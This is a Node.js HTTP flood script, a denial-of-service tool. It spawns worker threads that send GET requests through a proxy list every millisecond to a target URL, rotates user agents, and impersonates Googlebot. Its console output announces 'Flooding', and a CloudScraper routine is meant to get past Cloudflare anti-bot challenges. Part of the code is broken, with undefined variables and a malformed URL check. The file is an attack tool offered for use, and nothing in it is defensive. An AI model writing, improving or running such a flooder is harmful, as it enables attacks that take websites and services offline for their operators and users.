process.setMaxListeners(0);
process.on('uncaughtException', (err, origin) => {
	console.log('Caught exception:', err, '\nException origin:', origin);
})
process.on('unhandledRejection', (reason, promise) => {
	console.log('Unhandled Rejection at:', promise, '\nReason:', reason);
})

const {
	Worker,
	isMainThread,
	parentPort,
	workerData
} = require('worker_threads');

const net = require('net');
const fs = require('fs');
const url = require('url');

const UAs = [
	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
	"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
];

function randomInt(n) {
	return Math.floor(Math.random() * n);
}

function randomVar(arr) {
	return arr[randomInt(arr.length)];
}

const mainArgs = process.argv.slice(2);
var myWorkers = []

if (isMainThread) {
	if (!mainArgs[0] !== !mainArgs[0].startsWith('http://') && !mainArgs[0].startsWith('https://')) {
		console.log('\x1b[31m [-]\x1b[37m Could not parse for the url.');
		process.exit();
	}

	try {
		var proxies = fs.readFileSync(mainArgs[1]).toString().match(/\S+/g)
	} catch (err) {
		if (err.code !== 'ENOENT') throw err;
		console.log('\x1b[31m [-]\x1b[37m Could not parse for the proxy list.');
		process.exit();
	}

	if (!mainArgs[2] || isNaN(mainArgs[2])) {
		console.log("\x1b[31m [-]\x1b[37m Could not parse for the time.");
		process.exit();
	}

	var parsedTarget = url.parse(mainArgs[0]);

	for (i = 0; i < parseInt(process.argv[5]); i++) {
		var worker = new Worker(__filename, {
			workerData: {proxies: proxies, url: parsedTarget}
		});

		worker.on('online', () => {
			console.log("\x1b[32m[/]\x1b[37m Thread successfully launched");
		});

		myWorkers.push(worker);
	}

	setTimeout(() => {
		myWorkers.forEach(worker => {
			worker.terminate();
		});

		process.exit(1);
	}, mainArgs[2] * 1000);

	console.log("\x1b[36m[+]\x1b[37m The script has been successfully loaded.");
	console.log("\x1b[36m[+]\x1b[37m Proxies: %s", mainArgs[1]);
	console.log("\x1b[36m[+]\x1b[37m Flooding: %s", parsedTarget.href);
} else {
	workerData.proxies.forEach((proxy) => {
		proxy = proxy.split(':');

		var socket = net.createConnection({host: proxy[0], port: proxy[1]}, () => {
			setInterval(() => {
				send_req();
				let lmao = ('GET ' + workerData.url.href + ' HTTP/1.1\r\nHost: ' + workerData.url.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + randomVar(UAs) + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\n\r\n');
				socket.write(lmao.replace(/%RAND%/gi, Math.random()));
			}, 1);
		});

		socket.on('error', () => {});
	});
}




function send_req() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return console.log(error.message);
            }
            resolve(response.request.headers);
        });
    });

    getHeaders.then(function (result) {
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: false // A mettre en true si tu veux augmentée potentiellement les rq 
            }, function (error, response) {
                if (error) {
                    console.log(error.message);
                }
            });
        }
    });
}